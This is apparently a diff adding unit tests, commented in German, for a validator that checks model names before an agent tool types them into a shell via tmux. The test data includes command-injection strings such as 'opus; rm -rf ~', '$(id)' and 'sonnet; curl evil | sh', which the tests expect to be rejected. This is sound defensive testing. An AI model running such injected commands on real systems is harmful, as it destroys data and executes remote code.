@@ -133,3 +133,26 @@ describe('writeZuarbeitAgents', () => {
     }
   })
 })
+
+describe('isSafeModelName', () => {
+  // Der Name landet in einer Zeile, die per tmux in eine Shell getippt wird.
+  it('nimmt Aliase und volle IDs mit Anbieter und Variante', async () => {
+    const { isSafeModelName } = await import('../../src/main/agent/model-routing')
+    for (const m of ['sonnet', 'opus', 'claude-opus-5-5', 'anthropic/claude-sonnet-5-5', 'opus[1m]', 'gpt-6-astra', 'qwen3.8:27b']) {
+      assert.equal(isSafeModelName(m), true, m)
+    }
+  })
+  it('weist alles ab, was die Shell deuten wuerde', async () => {
+    const { isSafeModelName } = await import('../../src/main/agent/model-routing')
+    for (const m of ['opus; rm -rf ~', 'a b', '$(id)', '`id`', 'x|y', 'x&&y', "o'pus", 'x\ny', '', '-rf']) {
+      assert.equal(isSafeModelName(m), false, JSON.stringify(m))
+    }
+  })
+})
+
+describe('checkEscalation — Modellname', () => {
+  it('ein Shell-Fragment im Modell wird abgelehnt, auch ohne Opus', async () => {
+    const r = checkEscalation({ model: 'sonnet; curl evil | sh', entityId: 'workshop' })
+    assert.equal(r.ok, false)
+  })
+})
